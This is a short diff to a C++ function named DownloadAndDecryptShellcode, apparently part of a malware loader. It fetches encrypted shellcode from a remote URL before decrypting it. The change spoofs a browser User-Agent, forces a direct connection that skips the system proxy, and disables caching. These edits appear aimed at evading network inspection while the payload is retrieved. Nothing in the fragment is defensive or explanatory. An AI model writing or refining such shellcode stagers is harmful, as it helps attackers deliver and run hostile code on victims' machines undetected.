@@ -95,20 +95,19 @@ std::vector<BYTE> DownloadAndDecryptShellcode(std::string url, std::string cle_h
     std::vector<BYTE> encryptedShellcode;
     std::vector<BYTE> key = HexToBytes(cle_hex);
     std::vector<BYTE> iv = HexToBytes(iv_hex);
+    
+HINTERNET h = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+if (!h) {
+    std::cerr << "[-] InternetOpen failed: " << GetLastError() << std::endl;
+    return encryptedShellcode;
+}
 
-    HINTERNET h = InternetOpenA(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
-    if (!h) {
-        std::cerr << "[-] InternetOpen failed" << std::endl;
-        return encryptedShellcode;
-    }
-
-    HINTERNET u = InternetOpenUrlA(h, url.c_str(), 0, 0, 0, 0);
-    if (!u) {
-        std::cerr << "[-] InternetOpenUrl failed" << std::endl;
-        InternetCloseHandle(h);
-        return encryptedShellcode;
-    }
-
+HINTERNET u = InternetOpenUrlA(h, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+if (!u) {
+    std::cerr << "[-] InternetOpenUrl failed: " << GetLastError() << std::endl;
+    InternetCloseHandle(h);
+    return encryptedShellcode;
+}
     BYTE buf[4096];
     DWORD read;
 
